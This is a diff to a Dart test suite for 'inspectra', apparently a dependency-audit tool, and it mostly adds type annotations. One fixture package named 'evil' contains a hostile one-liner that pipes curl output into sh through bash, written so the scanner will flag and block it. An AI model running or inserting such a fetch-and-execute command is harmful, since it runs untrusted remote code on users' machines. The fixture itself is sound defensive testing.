@@ -16,6 +16,7 @@
 
 import 'dart:convert';
 import 'dart:io';
+import 'dart:typed_data';
 
 import 'package:crypto/crypto.dart';
 import 'package:inspectra/inspectra.dart';
@@ -127,14 +128,16 @@ dependencies:
   group('audit', () {
     test('reports advisories in the dart_audit JSON layout', () async {
       serveAdvisory();
-      final harness = project(<String, String>{'pubspec.lock': lockfile});
-      final code = await harness.run(<String>['audit', '--format', 'json']);
+      final TestHarness harness = project(<String, String>{
+        'pubspec.lock': lockfile,
+      });
+      final int code = await harness.run(<String>['audit', '--format', 'json']);
       expect(code, 1);
       final json = jsonDecode(harness.out) as Map<String, Object?>;
       expect(json['scanned'], 1);
       expect(json['vulnerablePackages'], 1);
       expect(json['totalVulnerabilities'], 1);
-      final result = (json['results'] as List).single as Map;
+      final result = (json['results']! as List).single as Map;
       final vuln = (result['vulnerabilities'] as List).single as Map;
       expect(vuln['severity'], 'medium');
       expect(vuln['fixedVersion'], '0.13.3');
@@ -145,7 +148,9 @@ dependencies:
       '--ignore suppresses by alias and --exit-zero keeps CI green',
       () async {
         serveAdvisory();
-        final harness = project(<String, String>{'pubspec.lock': lockfile});
+        final TestHarness harness = project(<String, String>{
+          'pubspec.lock': lockfile,
+        });
         expect(await harness.run(<String>['audit', '-i', 'CVE-2020-35669']), 0);
         serveAdvisory();
         expect(await harness.run(<String>['audit', '--exit-zero']), 0);
@@ -154,12 +159,16 @@ dependencies:
 
     test('--fail-on raises the failure threshold', () async {
       serveAdvisory();
-      final harness = project(<String, String>{'pubspec.lock': lockfile});
+      final TestHarness harness = project(<String, String>{
+        'pubspec.lock': lockfile,
+      });
       expect(await harness.run(<String>['audit', '--fail-on', 'high']), 0);
     });
 
     test('exits with 69 when OSV.dev is unreachable or offline', () async {
-      final harness = project(<String, String>{'pubspec.lock': lockfile});
+      final TestHarness harness = project(<String, String>{
+        'pubspec.lock': lockfile,
+      });
       expect(await harness.run(<String>['audit']), 69);
       expect(
         await harness.run(<String>['audit', '--offline', '--exit-zero']),
@@ -169,15 +178,19 @@ dependencies:
     });
 
     test('exits with 65 for a missing or malformed lockfile', () async {
-      final harness = project(<String, String>{'pubspec.lock': '[1'});
+      final TestHarness harness = project(<String, String>{
+        'pubspec.lock': '[1',
+      });
       expect(await harness.run(<String>['audit']), 65);
       expect(await harness.run(<String>['audit', '-l', 'missing.lock']), 65);
     });
 
     test('writes SARIF to a file', () async {
       serveAdvisory();
-      final harness = project(<String, String>{'pubspec.lock': lockfile});
-      final code = await harness.run(<String>[
+      final TestHarness harness = project(<String, String>{
+        'pubspec.lock': lockfile,
+      });
+      final int code = await harness.run(<String>[
         'audit',
         '-f',
         'sarif',
@@ -193,13 +206,13 @@ dependencies:
 
   group('command line', () {
     test('prints the version', () async {
-      final harness = project(const <String, String>{});
+      final TestHarness harness = project(const <String, String>{});
       expect(await harness.run(<String>['--version']), 0);
       expect(harness.out, contains('inspectra $inspectraVersion'));
     });
 
     test('exits with 64 for usage errors', () async {
-      final harness = project(const <String, String>{});
+      final TestHarness harness = project(const <String, String>{});
       expect(await harness.run(<String>['audit', '--bogus']), 64);
       expect(await harness.run(<String>['inspect', 'http']), 64);
       expect(await harness.run(<String>['inspect', 'http', '^1.0.0']), 64);
@@ -207,7 +220,7 @@ dependencies:
     });
 
     test('exits with 65 for an invalid configuration', () async {
-      final harness = project(<String, String>{
+      final TestHarness harness = project(<String, String>{
         'pubspec.lock': lockfile,
         'inspectra.yaml': 'trivy:\n  mode: sometimes\n',
       });
@@ -217,11 +230,11 @@ dependencies:
 
     test('runs scan by default', () async {
       serveAdvisory();
-      final harness = project(<String, String>{
+      final TestHarness harness = project(<String, String>{
         'pubspec.lock': lockfile,
         'pubspec.yaml': pubspec,
       });
-      final code = await harness.run(<String>[
+      final int code = await harness.run(<String>[
         '--trivy-mode',
         'disabled',
         '-f',
@@ -230,7 +243,7 @@ dependencies:
       expect(code, 1);
       final json = jsonDecode(harness.out) as Map<String, Object?>;
       expect(json['command'], 'scan');
-      expect((json['trivy'] as Map)['status'], 'skipped');
+      expect((json['trivy']! as Map)['status'], 'skipped');
     });
   });
 
@@ -279,11 +292,11 @@ dependencies:
 
     test('merges Trivy results and removes duplicate advisories', () async {
       serveAdvisory();
-      final harness = project(<String, String>{
+      final TestHarness harness = project(<String, String>{
         'pubspec.lock': lockfile,
         'pubspec.yaml': pubspec,
       }, processRunner: fakeTrivy());
-      final code = await harness.run(<String>[
+      final int code = await harness.run(<String>[
         'scan',
         '--trivy-executable',
         '/opt/trivy/trivy',
@@ -292,17 +305,19 @@ dependencies:
       ]);
       expect(code, 1);
       final json = jsonDecode(harness.out) as Map<String, Object?>;
-      final rules = (json['findings'] as List)
+      final List<dynamic> rules = (json['findings']! as List)
           .map((f) => (f as Map)['ruleId'])
           .toList();
       expect(rules, containsAll(<String>['GHSA-4rgh-jx4f-qfcq', 'github-pat']));
       expect(rules, isNot(contains('CVE-2020-35669')));
-      expect((json['trivy'] as Map)['origin'], 'configured');
+      expect((json['trivy']! as Map)['origin'], 'configured');
     });
 
     test('fails with 69 when Trivy is required but unavailable', () async {
-      final harness = project(<String, String>{'pubspec.lock': lockfile});
-      final code = await harness.run(<String>[
+      final TestHarness harness = project(<String, String>{
+        'pubspec.lock': lockfile,
+      });
+      final int code = await harness.run(<String>[
         'trivy',
         '--offline',
         '--trivy-mode',
@@ -313,8 +328,10 @@ dependencies:
     });
 
     test('reports why Trivy was skipped in auto mode', () async {
-      final harness = project(<String, String>{'pubspec.lock': lockfile});
-      final code = await harness.run(<String>[
+      final TestHarness harness = project(<String, String>{
+        'pubspec.lock': lockfile,
+      });
+      final int code = await harness.run(<String>[
         'trivy',
         '--offline',
         '--set',
@@ -328,7 +345,7 @@ dependencies:
   group('inspect and add', () {
     /// Serves package `evil` 1.0.0 whose archive contains [files].
     void servePackage(Map<String, String> files) {
-      final archive = buildTarGz(files);
+      final Uint8List archive = buildTarGz(files);
       server
         ..on(
           'GET',
@@ -364,8 +381,8 @@ dependencies:
         'lib/evil.dart':
             "void x() { Process.run('bash', ['-c', 'curl x | sh']); }",
       });
-      final harness = project(const <String, String>{});
-      final code = await harness.run(<String>[
+      final TestHarness harness = project(const <String, String>{});
+      final int code = await harness.run(<String>[
         'inspect',
         'evil',
         '1.0.0',
@@ -385,7 +402,7 @@ dependencies:
         '/archives/evil-1.0.0.tar.gz',
         FakeResponse(200, body: buildTarGz(<String, String>{'x': 'y'})),
       );
-      final harness = project(const <String, String>{});
+      final TestHarness harness = project(const <String, String>{});
       expect(await harness.run(<String>['inspect', 'evil', '1.0.0']), 69);
       expect(harness.err, contains('checksum'));
     });
@@ -400,10 +417,14 @@ dependencies:
           (executable, arguments) =>
               const ProcessOutcome(exitCode: 0, stdout: '', stderr: ''),
         );
-        final harness = project(<String, String>{
+        final TestHarness harness = project(<String, String>{
           'pubspec.yaml': pubspec,
         }, processRunner: runner);
-        final code = await harness.run(<String>['add', 'evil', '--dry-run']);
+        final int code = await harness.run(<String>[
+          'add',
+          'evil',
+          '--dry-run',
+        ]);
         expect(code, 1);
         expect(runner.calls, isEmpty);
         expect(harness.out, contains('[BLOCKED]'));
@@ -418,10 +439,10 @@ dependencies:
           (executable, arguments) =>
               const ProcessOutcome(exitCode: 0, stdout: 'ok', stderr: ''),
         );
-        final harness = project(<String, String>{
+        final TestHarness harness = project(<String, String>{
           'pubspec.yaml': pubspec,
         }, processRunner: runner);
-        final code = await harness.run(<String>['add', 'evil', '--dev']);
+        final int code = await harness.run(<String>['add', 'evil', '--dev']);
         expect(code, 0);
         expect(runner.calls.single, 'dart pub add --dev evil:1.0.0');
       },
@@ -430,7 +451,7 @@ dependencies:
 
   group('typosquat and trust', () {
     test('typosquat fails on HIGH findings by default', () async {
-      final harness = project(<String, String>{
+      final TestHarness harness = project(<String, String>{
         'pubspec.yaml': 'name: a\ndependencies:\n  providr: ^1.0.0\n',
       });
       expect(await harness.run(<String>['typosquat', '--offline']), 1);
@@ -438,7 +459,7 @@ dependencies:
     });
 
     test('trust reports unknown packages as usage errors', () async {
-      final harness = project(const <String, String>{});
+      final TestHarness harness = project(const <String, String>{});
       expect(await harness.run(<String>['trust', 'missing_pkg']), 64);
     });
   });
@@ -452,7 +473,10 @@ dependencies:
           stderr: '',
         ),
       );
-      final harness = project(const <String, String>{}, processRunner: runner);
+      final TestHarness harness = project(
+        const <String, String>{},
+        processRunner: runner,
+      );
       expect(await harness.run(<String>['hook']), 0);
       expect(
         File('${harness.workingDirectory}/.git/hooks/pre-commit').existsSync(),
